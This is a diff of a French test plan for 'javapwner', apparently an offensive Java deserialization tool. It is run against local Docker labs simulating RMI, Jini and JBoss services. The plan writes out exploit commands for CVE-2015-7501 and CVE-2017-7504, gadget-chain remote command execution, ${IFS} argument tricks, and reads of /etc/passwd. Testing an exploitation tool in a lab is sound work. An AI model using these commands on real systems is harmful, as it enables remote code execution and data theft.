 
-## Section H — JBoss AS 4.2.3.GA — HTTP invoker
+## Section H — RMI Java 21 (port 1399)
 
-Simule : JBoss AS 4.x/5.x/6.x legacy (très courant dans les SI bancaires et
-industriels), CVE-2015-7501, CVE-2017-7504, CVE-2017-12149.
-
-### H-1 Scan JBoss HTTP
+### H-1 : Scan
 
 ```bash
-.venv/bin/javapwner jboss scan -t 127.0.0.1 -p 8080
+javapwner rmi scan -t $T -p 1399
 ```
 
-| ID   | Critère                                         | Résultat attendu             | Statut | Résultat observé |
-|------|-------------------------------------------------|------------------------------|--------|------------------|
-| H-1a | JBoss détecté (fingerprint)                     | `JBoss / WildFly detected`   | [x]    | JBoss / WildFly detected  |
-| H-1b | Version 4.2.3.GA identifiée                     | version affichée             | [x]    | JBoss 4.x/5.x/6.x  |
-| H-1c | `/invoker/JMXInvokerServlet` trouvé             | `FOUND` avec `[CVE-2015-7501]`| [x]   | FOUND [CVE-2015-7501]  |
-| H-1d | `/invoker/EJBInvokerServlet` trouvé             | `FOUND` avec `[CVE-2017-7504]`| [x]   | FOUND [CVE-2017-7504]  |
-| H-1e | Suggestion d'exploitation affichée              | message "Run 'jboss exploit'" | [x]   | message affiché  |
+**Attendu** : Registry confirmé, JEP290 unfiltered.
 
-### H-2 Info JBoss
+**Statut** : `[X]`
+
+### H-2 : Exploitation
 
 ```bash
-.venv/bin/javapwner jboss info -t 127.0.0.1 -p 8080
+javapwner rmi exploit -t $T -p 1399 --gadget $G --cmd "touch /tmp/h2-pwned"
+docker exec lab-rmi-java21 test -f /tmp/h2-pwned && echo PASS || echo FAIL
+docker exec lab-rmi-java21 rm -f /tmp/h2-pwned
 ```
 
-| ID   | Critère                       | Résultat attendu        | Statut | Résultat observé |
-|------|-------------------------------|-------------------------|--------|------------------|
-| H-2a | Produit et version détectés   | JBoss 4.x               | [x]    | JBoss 4.x  |
-| H-2b | Invoker endpoints détaillés   | chaque endpoint + statut| [x]    | JMX+EJB+readonly+WebConsole  |
+**Attendu** : `PASS`
 
-### H-3 Exploit HTTP — auto gadget
-
-```bash
-.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 --cmd 'touch /tmp/jboss-auto'
-docker exec lab-jboss4 test -f /tmp/jboss-auto && echo "PASS" || echo "FAIL"
-```
-
-| ID   | Critère                                   | Résultat attendu          | Statut | Résultat observé |
-|------|-------------------------------------------|---------------------------|--------|------------------|
-| H-3a | Mode auto — gadget trouvé et utilisé      | "Using gadget:"           | [x]    | Using gadget: CC6  |
-| H-3b | `likely_success` (HTTP 500)               | message vert              | [x]    | HTTP 200, likely_success=True  |
-| H-3c | Fichier créé dans conteneur               | `PASS`                    | [x]    | PASS  |
-
-### H-4 Exploit HTTP — CC6 explicite sur `/invoker/JMXInvokerServlet`
-
-```bash
-.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/jboss-jmx' \
-    --path /invoker/JMXInvokerServlet
-docker exec lab-jboss4 test -f /tmp/jboss-jmx && echo "PASS" || echo "FAIL"
-```
-
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| H-4a | `likely_success`      | HTTP 500 = vert  | [x]    | likely_success=True  |
-| H-4b | Fichier créé          | `PASS`           | [x]    | PASS  |
-
-### H-5 Exploit HTTP — CC6 sur `/invoker/EJBInvokerServlet` (CVE-2017-7504)
-
-```bash
-.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/jboss-ejb' \
-    --path /invoker/EJBInvokerServlet
-docker exec lab-jboss4 test -f /tmp/jboss-ejb && echo "PASS" || echo "FAIL"
-```
-
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| H-5a | `likely_success`      | HTTP 500 = vert  | [x]    | likely_success=True  |
-| H-5b | Fichier créé          | `PASS`           | [x]    | PASS  |
-
-### H-6 Exploit HTTP — commande de lecture
-
-```bash
-.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
-    --gadget CommonsCollections6 \
-    --cmd 'sh -c "id > /tmp/jboss-id.txt"'
-docker exec lab-jboss4 cat /tmp/jboss-id.txt
-```
-
-| ID   | Critère                          | Résultat attendu        | Statut | Résultat observé |
-|------|----------------------------------|-------------------------|--------|------------------|
-| H-6a | Fichier contient sortie de `id`  | `uid=0(root)` ou autre  | [x]    | uid=0(root)  |
+**Statut** : `[X]`
 
 ---
 
-## Section I — JBoss AS 4.2.3.GA — JNP/DGC (port 4444)
+## Section I — Commandes RMI transversales
 
-Simule : exploitation du canal JNP de JBoss (JRMP derrière le naming service).
-Commun dans les SI qui exposent le port JNDI/JNP JBoss.
-
-### I-1 JNP Scan
+### I-1 : Auto-scan tous ports connus (sans -p)
 
 ```bash
-.venv/bin/javapwner jboss jnp-scan -t 127.0.0.1 -p 4444
+javapwner rmi scan -t $T
 ```
 
-| ID   | Critère                                     | Résultat attendu           | Statut | Résultat observé |
-|------|---------------------------------------------|----------------------------|--------|------------------|
-| I-1a | Service JNP détecté                         | `JNP service detected`     | [x]    | JNP service detected  |
-| I-1b | Noms JNDI affichés (java:/, jms/, etc.)     | liste non vide             | [x]    | 7 noms JNDI  |
-| I-1c | Suggestion exploitation affichée            | "Run 'jboss jnp-exploit'"  | [x]    | message affiché  |
+**Attendu** : détecte au moins les ports 1099, 1199, 1299, 1399 comme JRMP actifs.
 
-### I-2 JNP Exploit — auto gadget
+**Statut** : `[X]`
+
+### I-2 : Discover avec liste et plage de ports
 
 ```bash
-.venv/bin/javapwner jboss jnp-exploit -t 127.0.0.1 -p 4444 \
-    --cmd 'touch /tmp/jnp-auto'
-docker exec lab-jboss4 test -f /tmp/jnp-auto && echo "PASS" || echo "FAIL"
+javapwner rmi discover -t $T --ports 1099,1199,1299,1399,1499,1599
+javapwner rmi discover -t $T --port-range 1090:1110
 ```
 
-| ID   | Critère                                  | Résultat attendu           | Statut | Résultat observé |
-|------|------------------------------------------|----------------------------|--------|------------------|
-| I-2a | Auto gadget sélectionné                  | "Using gadget:"            | [x]    | Using gadget: CC6  |
-| I-2b | Payload livré                            | `likely_success` ou `sent` | [x]    | likely_success=True  |
-| I-2c | Fichier créé dans conteneur              | `PASS`                     | [x]    | PASS  |
+**Attendu** : liste des endpoints JRMP avec JEP290 et bound names.
 
-### I-3 JNP Exploit — CC6 explicite
+**Statut** : `[X]`
+
+### I-3 : Info détaillé
 
 ```bash
-.venv/bin/javapwner jboss jnp-exploit -t 127.0.0.1 -p 4444 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/jnp-cc6'
-docker exec lab-jboss4 test -f /tmp/jnp-cc6 && echo "PASS" || echo "FAIL"
+javapwner rmi info -t $T -p 1099
 ```
 
-| ID   | Critère               | Résultat attendu | Statut | Résultat observé |
-|------|-----------------------|------------------|--------|------------------|
-| I-3a | Livraison réussie     | `likely_success` | [x]    | likely_success=True  |
-| I-3b | Fichier créé          | `PASS`           | [x]    | PASS  |
+**Attendu** : section `RMI Endpoint Info` + `Bound Names` + `Security`.
+
+**Statut** : `[X]`
+
+### I-4 : Exécution de commande avec redirection (Runtime.exec)
+
+```bash
+# Sans espaces autour de > : fonctionne directement
+javapwner rmi exploit -t $T -p 1099 --gadget $G \
+  --cmd '/bin/sh -c id>/tmp/i4-out'
+docker exec lab-rmi-java8 cat /tmp/i4-out
+docker exec lab-rmi-java8 rm -f /tmp/i4-out
+
+# Avec ${IFS} pour contourner le split sur les espaces
+javapwner rmi exploit -t $T -p 1099 --gadget $G \
+  --cmd '/bin/sh -c cat${IFS}/etc/hostname>/tmp/i4-hostname'
+docker exec lab-rmi-java8 cat /tmp/i4-hostname
+docker exec lab-rmi-java8 rm -f /tmp/i4-hostname
+```
+
+**Attendu** : fichiers créés avec contenu lisible (uid=... ou hostname du conteneur).
+
+**Statut** : `[X]`
+
+### I-5 : URLDNS canary
+
+```bash
+javapwner rmi scan -t $T -p 1099 --urldns http://canary.test.local
+```
+
+**Attendu** : `URLDNS payload sent` sans erreur (fonctionnel en black-box ; résolution non vérifiable ici).
+
+**Statut** : `[X]`
 
 ---
 
-## Section J — Couverture des gadgets par protocole
+## Section J — Jini / Apache River (port 4160)
 
-Teste les chaînes les plus fréquentes en production sur chaque cible.
-Adapté selon les bibliothèques réellement dans le classpath des SI.
-
-### J-1 CC6 (CommonsCollections 3.1 — le plus commun)
-
-Validé dans C-5, D-4, E-3, F-3, G-6, H-4, I-3 — ne pas re-exécuter si déjà fait.
-
-### J-2 CC1 (CommonsCollections 3.1, JDK ≤ 8u70)
+### J-1 : Scan Unicast Discovery
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget CommonsCollections1 --cmd 'touch /tmp/rmi8-cc1'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-cc1 && echo "PASS" || echo "FAIL"
+javapwner jini scan -t $T -p 4160
 ```
 
-| ID   | Gadget              | Cible     | Statut | Résultat observé |
-|------|---------------------|-----------|--------|------------------|
-| J-2  | CommonsCollections1 | rmi-java8 | [F]    |                  FAIL: CC1 patchée Java 8u72+ (AnnotationInvocationHandler)  |
+**Attendu** :
+- Unicast Discovery v1 ou v2 confirmé
+- Groupes non vides
+- Endpoint JRMP extrait (127.0.0.1:4162)
+- Codebase URL : `http://127.0.0.1:8085`
+- JEP290 : unfiltered
 
-### J-3 CC5 (CommonsCollections 3.1, thread-safe)
+**Statut** : `[X]`
+
+### J-2 : Exploitation JRMP DGC (port 4162)
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget CommonsCollections5 --cmd 'touch /tmp/rmi8-cc5'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-cc5 && echo "PASS" || echo "FAIL"
+javapwner jini exploit -t $T -p 4162 --gadget $G --cmd "touch /tmp/j2-pwned"
+docker exec lab-jini-reggie test -f /tmp/j2-pwned && echo PASS || echo FAIL
+docker exec lab-jini-reggie rm -f /tmp/j2-pwned
 ```
 
-| ID   | Gadget              | Cible     | Statut | Résultat observé |
-|------|---------------------|-----------|--------|------------------|
-| J-3  | CommonsCollections5 | rmi-java8 | [F]    |                  FAIL: CC5 generation fails (InvocationTargetException Java 21 attacker)  |
+**Attendu** : `PASS`
 
-### J-4 CC7
+**Statut** : `[X]`
+
+### J-3 : Auto-exploit Jini
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget CommonsCollections7 --cmd 'touch /tmp/rmi8-cc7'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-cc7 && echo "PASS" || echo "FAIL"
+javapwner jini exploit -t $T -p 4162 --cmd "touch /tmp/j3-pwned"
+docker exec lab-jini-reggie test -f /tmp/j3-pwned && echo PASS || echo FAIL
+docker exec lab-jini-reggie rm -f /tmp/j3-pwned
 ```
 
-| ID   | Gadget              | Cible     | Statut | Résultat observé |
-|------|---------------------|-----------|--------|------------------|
-| J-4  | CommonsCollections7 | rmi-java8 | [x]    |                  PASS fichier créé  |
+**Attendu** : `PASS` — gadget auto-détecté affiché.
 
-### J-5 CommonsBeanutils1
+**Statut** : `[X]`
+
+### J-4 : Lecture fichier — /etc/hostname (path traversal codebase HTTP :8085)
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget CommonsBeanutils1 --cmd 'touch /tmp/rmi8-cbu1'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-cbu1 && echo "PASS" || echo "FAIL"
+javapwner jini read-file -t $T -p 4160 --path /etc/hostname
 ```
 
-| ID   | Gadget              | Cible     | Statut | Résultat observé |
-|------|---------------------|-----------|--------|------------------|
-| J-5  | CommonsBeanutils1   | rmi-java8 | [F]    |                  FAIL: commons-beanutils absent du classpath cible  |
+**Attendu** : hostname du conteneur affiché.
 
-### J-6 Spring1
+**Statut** : `[X]`
+
+### J-5 : Lecture fichier — /etc/passwd
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget Spring1 --cmd 'touch /tmp/rmi8-spring1'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-spring1 && echo "PASS" || echo "FAIL"
+javapwner jini read-file -t $T -p 4160 --path /etc/passwd
 ```
 
-| ID   | Gadget  | Cible     | Statut | Résultat observé |
-|------|---------|-----------|--------|------------------|
-| J-6  | Spring1 | rmi-java8 | [F]    |                  FAIL: spring absent du classpath cible  |
+**Attendu** : premières lignes d'`/etc/passwd` du conteneur affichées.
 
-### J-7 ROME
+**Statut** : `[X]`
+
+### J-6 : Lecture fichier — chemin inexistant
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget ROME --cmd 'touch /tmp/rmi8-rome'
-docker exec lab-rmi-java8 test -f /tmp/rmi8-rome && echo "PASS" || echo "FAIL"
+javapwner jini read-file -t $T -p 4160 --path /nonexistent/file 2>&1
 ```
 
-| ID   | Gadget | Cible     | Statut | Résultat observé |
-|------|--------|-----------|--------|------------------|
-| J-7  | ROME   | rmi-java8 | [F]    |                  FAIL: ROME absent du classpath cible  |
+**Attendu** : erreur 404 ou message "not found" sans crash.
+
+**Statut** : `[X]`
+
+### J-7 : Multicast Discovery (LAN)
+
+```bash
+javapwner jini multicast --wait 2
+```
+
+**Attendu** : réponse du conteneur jini-reggie reçue, ou timeout propre si multicast bloqué sur l'interface.
+
+**Statut** : `[X]`
+
+### J-8 : Sortie JSON
+
+```bash
+javapwner --json jini scan -t $T -p 4160 | python3 -m json.tool | \
+  grep -E '"unicast_version"|"jrmp_port"|"codebase_urls"'
+```
+
+**Attendu** : champs peuplés avec les bonnes valeurs.
+
+**Statut** : `[X]`
+
+### J-9 : Gadgets Jini
+
+```bash
+javapwner jini gadgets
+```
+
+**Attendu** : liste incluant CommonsCollections6.
+
+**Statut** : `[X]`
+
+### J-10 : Scan sur le port JRMP (4162) — pas de Unicast Discovery
+
+```bash
+javapwner jini scan -t $T -p 4162
+```
+
+**Attendu** : JRMP détecté mais pas de Unicast Discovery (4162 est le transport JRMP, pas le port Discovery).
+
+**Statut** : `[X]`
 
 ---
 
-## Section K — Scénarios de production simulés
+## Section K — JBoss AS 4.2.3.GA HTTP Invoker (port 8080)
 
-Ces tests reproduisent les configurations réelles les plus rencontrées lors de
-pentests en SI de production.
-
-### K-1 JMX exposé sur port non standard
-
-Simule un port JMX mal configuré sur un serveur applicatif (Tomcat 9, Kafka,
-Cassandra, Elasticsearch avec JMX). Le registre RMI est sur le port JMX.
+### K-1 : Scan fingerprint
 
 ```bash
-# rmi-java11 sur port 1199 simule un JMX mal exposé
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1199 -G
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1199 \
-    --cmd 'sh -c "hostname > /tmp/k1-jmx.txt"'
-docker exec lab-rmi-java11 cat /tmp/k1-jmx.txt
+javapwner jboss scan -t $T -p 8080
 ```
 
-| ID   | Critère                                    | Résultat attendu   | Statut | Résultat observé |
-|------|--------------------------------------------|--------------------|--------|------------------|
-| K-1a | Scan identifie le service comme JRMP       | JRMP confirmé      | [x]    | JRMP confirmed  |
-| K-1b | Auto gadget fonctionne sans gadget spécifié| fichier créé       | [x]    | PASS: fichier créé CC6  |
+**Attendu** :
+- `JBoss / WildFly detected`
+- `/invoker/JMXInvokerServlet` trouvé [CVE-2015-7501]
+- `/invoker/EJBInvokerServlet` trouvé [CVE-2017-7504]
 
-### K-2 Objet RMI sur port de l'objet (pas le registry)
+**Statut** : `[X]`
 
-Simule l'exploitation directe de l'objet remote (port 1098 / HelloService) via
-DGC — pattern fréquent quand le registry est filtré mais pas les objets.
+### K-2 : Exploitation CVE-2015-7501 (JMXInvokerServlet)
 
 ```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 1098
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1098 \
-    --gadget CommonsCollections6 --cmd 'touch /tmp/k2-objport'
-docker exec lab-rmi-java8 test -f /tmp/k2-objport && echo "PASS" || echo "FAIL"
+javapwner jboss exploit -t $T -p 8080 --gadget $G \
+  --cmd "touch /tmp/k2-pwned" --path /invoker/JMXInvokerServlet
+docker exec lab-jboss4 test -f /tmp/k2-pwned && echo PASS || echo FAIL
+docker exec lab-jboss4 rm -f /tmp/k2-pwned
 ```
 
-| ID   | Critère                                      | Résultat attendu         | Statut | Résultat observé |
-|------|----------------------------------------------|--------------------------|--------|------------------|
-| K-2a | DGC accessible sur port objet (1098)         | JRMP ou DGC confirmé     | [x]    | DGC unfiltered port 1098  |
-| K-2b | Exploit DGC sur port objet réussi            | `PASS`                   | [x]    | PASS  |
+**Attendu** : `PASS`
 
-### K-3 Multi-ports — discover automatique
+**Statut** : `[X]`
 
-Simule la situation où l'analyste ne connaît pas les ports. `discover` scanne
-les ports courants.
+### K-3 : Exploitation CVE-2017-7504 (EJBInvokerServlet)
 
 ```bash
-.venv/bin/javapwner rmi discover -t 127.0.0.1
+javapwner jboss exploit -t $T -p 8080 --gadget $G \
+  --cmd "touch /tmp/k3-pwned" --path /invoker/EJBInvokerServlet
+docker exec lab-jboss4 test -f /tmp/k3-pwned && echo PASS || echo FAIL
+docker exec lab-jboss4 rm -f /tmp/k3-pwned
 ```
 
-| ID   | Critère                                         | Résultat attendu          | Statut | Résultat observé |
-|------|-------------------------------------------------|---------------------------|--------|------------------|
-| K-3a | Ports 1099 et 1199/1299/1399 découverts         | plusieurs services listés | [x]    | 1097/1098/1099/4444  |
-| K-3b | Registry list exécutée sur chaque port trouvé   | noms liés affichés        | [x]    | noms listés  |
+**Attendu** : `PASS`
 
-### K-4 JBoss avec port HTTP sur 8080 et JNP sur 4444 — attaque en deux phases
+**Statut** : `[X]`
 
-Simule le schéma classique de pentest JBoss : détection HTTP, puis pivot JNP.
+### K-4 : Auto-exploit (auto-détection du path)
 
 ```bash
-# Phase 1 : HTTP invoker
-.venv/bin/javapwner jboss scan -t 127.0.0.1 -p 8080
-.venv/bin/javapwner jboss exploit -t 127.0.0.1 -p 8080 \
-    --cmd 'sh -c "echo phase1 > /tmp/k4-phase1.txt"'
-
-# Phase 2 : JNP/DGC
-.venv/bin/javapwner jboss jnp-scan -t 127.0.0.1 -p 4444
-.venv/bin/javapwner jboss jnp-exploit -t 127.0.0.1 -p 4444 \
-    --cmd 'sh -c "echo phase2 > /tmp/k4-phase2.txt"'
-
-docker exec lab-jboss4 cat /tmp/k4-phase1.txt /tmp/k4-phase2.txt
+javapwner jboss exploit -t $T -p 8080 --gadget $G --cmd "touch /tmp/k4-pwned"
+docker exec lab-jboss4 test -f /tmp/k4-pwned && echo PASS || echo FAIL
+docker exec lab-jboss4 rm -f /tmp/k4-pwned
 ```
 
-| ID   | Critère                              | Résultat attendu           | Statut | Résultat observé |
-|------|--------------------------------------|----------------------------|--------|------------------|
-| K-4a | Scan HTTP identifie JBoss + endpoints| `FOUND` pour JMX+EJB       | [x]    | FOUND JMX+EJB+readonly  |
-| K-4b | HTTP exploit crée phase1.txt         | `phase1`                   | [x]    | PASS  |
-| K-4c | JNP scan liste les noms JNDI         | bindings JBoss affichés    | [x]    | 7 noms JNDI  |
-| K-4d | JNP exploit crée phase2.txt          | `phase2`                   | [x]    | PASS  |
+**Attendu** : `PASS` — path sélectionné affiché.
 
-### K-5 Reverse shell simulé (exfiltration de données)
+**Statut** : `[X]`
 
-Simule la lecture de fichiers sensibles post-exploitation.
+### K-5 : Info JBoss
 
 ```bash
-# Lecture /etc/passwd via RMI java8
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget CommonsCollections6 \
-    --cmd 'sh -c "cat /etc/passwd > /tmp/k5-passwd.txt"'
-docker exec lab-rmi-java8 wc -l /tmp/k5-passwd.txt
-
-# Lecture /etc/hostname via Jini
-.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4162 \
-    --gadget CommonsCollections6 \
-    --cmd 'sh -c "cat /etc/hostname > /tmp/k5-jini.txt"'
-docker exec lab-jini-reggie cat /tmp/k5-jini.txt
+javapwner jboss info -t $T -p 8080
 ```
 
-| ID   | Critère                                   | Résultat attendu         | Statut | Résultat observé |
-|------|-------------------------------------------|--------------------------|--------|------------------|
-| K-5a | `/etc/passwd` lu via RMI CC6              | plusieurs lignes         | [x]    | 19 lignes  |
-| K-5b | `/etc/hostname` lu via Jini CC6           | hostname du conteneur    | [x]    | hostname conteneur Jini  |
+**Attendu** : produit et version JBoss détectés, endpoints listés.
 
-### K-6 Verbose et mode debug
+**Statut** : `[X]`
 
-Vérifie l'exploitabilité du mode `--verbose` pour le débogage.
+### K-6 : Sortie JSON
 
 ```bash
-.venv/bin/javapwner --verbose rmi scan -t 127.0.0.1 -p 1099
-.venv/bin/javapwner --verbose jini scan -t 127.0.0.1 -p 4160
+javapwner --json jboss scan -t $T -p 8080 | python3 -m json.tool | \
+  grep -E '"product"|"version"|"endpoints"'
 ```
 
-| ID   | Critère                                       | Résultat attendu          | Statut | Résultat observé |
-|------|-----------------------------------------------|---------------------------|--------|------------------|
-| K-6a | Mode verbose affiche infos supplémentaires    | hex dumps, raw strings    | [x]    | class descriptors + codebase  |
-| K-6b | Aucun crash en mode verbose                   | sortie propre             | [x]    | pas de crash  |
+**Statut** : `[X]`
 
 ---
 
-## Section L — Robustesse et cas limites
+## Section L — JBoss JNP/JRMP (port 4444)
 
-### L-1 Port fermé
-
-```bash
-.venv/bin/javapwner rmi scan -t 127.0.0.1 -p 9999
-```
-
-| ID   | Critère                        | Résultat attendu             | Statut | Résultat observé |
-|------|--------------------------------|------------------------------|--------|------------------|
-| L-1a | Erreur propre sans traceback   | `port appears closed` ou sim.| [x]    | Connection refused  |
-
-### L-2 Mauvais gadget (non disponible dans ysoserial)
+### L-1 : JNP Scan
 
 ```bash
-.venv/bin/javapwner rmi exploit -t 127.0.0.1 -p 1099 \
-    --gadget GadgetInexistant --cmd 'id'
+javapwner jboss jnp-scan -t $T
 ```
 
-| ID   | Critère                               | Résultat attendu          | Statut | Résultat observé |
-|------|---------------------------------------|---------------------------|--------|------------------|
-| L-2a | Message d'erreur clair, pas de crash  | erreur sur gadget inconnu | [x]    | ClassNotFoundException gadget  |
+**Attendu** :
+- `JNP endpoint confirmed`
+- Port JRMP transport extrait (4447)
+- Bound names listés si disponibles
 
-### L-3 Auto mode — aucun gadget compatible (classpath vide)
+**Statut** : `[X]`
 
-> Ce test nécessite un serveur RMI sans commons-collections.
-> **Simulation** : utiliser un port où aucun gadget ne s'exécute,
-> ou mocker en local.
+### L-2 : JNP Exploit DGC dirty()
 
 ```bash
-# Pas de service sur ce port → probe_gadgets retourne []
-.venv/bin/javapwner jini exploit -t 127.0.0.1 -p 4160 --cmd 'id'
-# Attention : port 4160 = Discovery, pas JRMP pur → probe doit échouer proprement
+javapwner jboss jnp-exploit -t $T --gadget $G --cmd "touch /tmp/l2-pwned"
+docker exec lab-jboss4 test -f /tmp/l2-pwned && echo PASS || echo FAIL
+docker exec lab-jboss4 rm -f /tmp/l2-pwned
 ```
 
-| ID   | Critère                                        | Résultat attendu               | Statut | Résultat observé |
-|------|------------------------------------------------|--------------------------------|--------|------------------|
-| L-3a | Message clair "No compatible gadgets found"    | erreur explicative + exit 1    | [x]    | No compatible gadgets found  |
+**Attendu** : `PASS`
 
-### L-4 Timeout réseau
+**Statut** : `[X]`
+
+### L-3 : JNP Auto-exploit
 
 ```bash
-# Host non routable — le timeout doit être respecté
-timeout 15 .venv/bin/javapwner rmi scan -t 10.255.255.1 -p 1099 ; echo "exit: $?"
+javapwner jboss jnp-exploit -t $T --cmd "touch /tmp/l3-pwned"
+docker exec lab-jboss4 test -f /tmp/l3-pwned && echo PASS || echo FAIL
+docker exec lab-jboss4 rm -f /tmp/l3-pwned
 ```
 
-| ID   | Critère                                      | Résultat attendu        | Statut | Résultat observé |
-|------|----------------------------------------------|-------------------------|--------|------------------|
-| L-4a | La commande se termine en < 15 s             | timeout respecté        | [x]    | terminé < 15s  |
-| L-4b | Message d'erreur de connexion, pas de crash  | erreur lisible          | [x]    | timed out — message lisible  |
+**Attendu** : `PASS`
 
-### L-5 Sortie JSON en cas d'erreur
+**Statut** : `[X]`
+
+### L-4 : JNP port explicite
 
 ```bash
-.venv/bin/javapwner --json rmi scan -t 127.0.0.1 -p 9999 | python3 -m json.tool
+javapwner jboss jnp-scan -t $T -p 4444
+javapwner jboss jnp-exploit -t $T -p 4444 --gadget $G --cmd "touch /tmp/l4-pwned"
+docker exec lab-jboss4 test -f /tmp/l4-pwned && echo PASS || echo FAIL
+docker exec lab-jboss4 rm -f /tmp/l4-pwned
 ```
 
-| ID   | Critère                       | Résultat attendu       | Statut | Résultat observé |
-|------|-------------------------------|------------------------|--------|------------------|
-| L-5a | JSON valide même en erreur    | pas d'erreur json.tool | [x]    | JSON valide avec champ error  |
+**Attendu** : `PASS`
 
-### L-6 Gadgets disponibles
-
-```bash
-.venv/bin/javapwner rmi gadgets
-.venv/bin/javapwner jini gadgets
-```
-
-| ID   | Critère                                     | Résultat attendu           | Statut | Résultat observé |
-|------|---------------------------------------------|----------------------------|--------|------------------|
-| L-6a | Liste non vide retournée                    | ≥ 10 gadgets               | [x]    | 34 gadgets  |
-| L-6b | URLDNS et JRMPClient présents dans la liste | présents                   | [x]    | URLDNS + JRMPClient présents  |
+**Statut** : `[X]`
 
 ---
 
-## Section M — Sécurité et cohérence des résultats
+## Section M — Détection de version JVM
 
-### M-1 `likely_success` vs exécution réelle — cohérence
-
-Pour chaque test d'exploitation réussi, `likely_success = True` doit
-correspondre à une exécution réelle dans le conteneur.
-
-| ID   | Scénario                                | `likely_success` attendu | Fichier créé attendu | Statut |
-|------|-----------------------------------------|--------------------------|----------------------|--------|
-| M-1a | rmi-java8 CC6 DGC                       | True                     | Oui                  | [x]    |
-| M-1b | rmi-java11 CC6 DGC                      | True                     | Oui                  | [x]    |
-| M-1c | rmi-java17 CC6 DGC                      | True                     | Oui                  | [x]    |
-| M-1d | rmi-java21 CC6 DGC                      | True                     | Oui                  | [x]    |
-| M-1e | jini exploit CC6                        | True ou sent             | Oui                  | [x]    |
-| M-1f | jboss HTTP CC6                          | True (HTTP 500)          | Oui                  | [x]    |
-| M-1g | jboss JNP CC6                           | True                     | Oui                  | [x]    |
-
-### M-2 Pas de faux positifs sur `likely_success`
-
-Envoyer un gadget inexistant ou un payload corrompu → `likely_success` doit être False.
+### M-1 : SUID MarshalledObject JDK8 depuis la réponse Registry (Java 8)
 
 ```bash
-# Payload invalide : envoyer des bytes aléatoires (simulation)
-# On peut mocker en forçant un mauvais gadget via CLI (voir L-2)
+javapwner --json rmi scan -t $T -p 1099 | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+print('jvm_hint:', d.get('jvm_hint'))
+print('jvm_confidence:', d.get('jvm_confidence'))
+"
 ```
 
-| ID   | Critère                                  | Résultat attendu     | Statut | Résultat observé |
-|------|------------------------------------------|----------------------|--------|------------------|
-| M-2a | Mauvais gadget → `likely_success = False`| pas de faux positif  | [x]    | likely_success=False  |
+**Attendu** :
+```
+jvm_hint: jdk8
+jvm_confidence: high
+```
+
+**Statut** : `[~]`
+
+### M-2 : SUID MarshalledObject JDK9+ (Java 11)
+
+```bash
+javapwner --json rmi scan -t $T -p 1199 | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+print('jvm_hint:', d.get('jvm_hint'))
+print('jvm_confidence:', d.get('jvm_confidence'))
+"
+```
+
+**Attendu** :
+```
+jvm_hint: jdk9+
+jvm_confidence: high
+```
+
+**Statut** : `[~]`
+
+### M-3 : Exploitabilité CRITICAL avec gadgets confirmés (-G)
+
+```bash
+javapwner --json rmi scan -t $T -p 1099 -G | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+print('exploitability:', d.get('exploitability'))
+print('gadgets:', d.get('gadgets_compatible'))
+"
+```
+
+**Attendu** :
+```
+exploitability: critical
+gadgets: ['CommonsCollections6', ...]
+```
+
+**Statut** : `[X]`
+
+### M-4 : Exploitabilité HIGH sans gadgets sondés
+
+```bash
+javapwner --json rmi scan -t $T -p 1099 | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+print('exploitability:', d.get('exploitability'))
+print('gadgets_detection_skipped:', d.get('gadgets_detection_skipped'))
+"
+```
+
+**Attendu** :
+```
+exploitability: high
+gadgets_detection_skipped: True
+```
+
+**Statut** : `[X]`
+
+### M-5 : Affichage CLI — "JVM estimate" dans la sortie texte
+
+```bash
+javapwner rmi scan -t $T -p 1199 | grep -i "JVM estimate"
+```
+
+**Attendu** : `JVM estimate : JDK 9+  (confidence: high)`
+
+**Statut** : `[~]`
+
+### M-6 : Vérification unitaire directe de infer_jdk_from_bytes
+
+```bash
+.venv/bin/python3 - <<'EOF'
+import struct
+from javapwner.core.serialization import infer_jdk_from_bytes
+
+# sun.misc → jdk8u121-8u231
+h, c = infer_jdk_from_bytes(b"filter: sun/misc/ObjectInputFilter REJECTED")
+assert h == "jdk8u121-8u231" and c == "high", f"Got {h}/{c}"
+
+# java.io + SUID JDK8 → jdk8u232+
+name = b"java.rmi.MarshalledObject"
+suid = struct.pack(">q", 7834398015428807710)
+cd = b"\xac\xed\x00\x05\x72" + struct.pack(">H", len(name)) + name + suid + b"\x02\x00\x00\x78"
+h2, c2 = infer_jdk_from_bytes(b"java/io/ObjectInputFilter\x00" + cd)
+assert h2 == "jdk8u232+" and c2 == "high", f"Got {h2}/{c2}"
+
+print("M-6 PASS")
+EOF
+```
+
+**Attendu** : `M-6 PASS`
+
+**Statut** : `[X]`
 
 ---
 
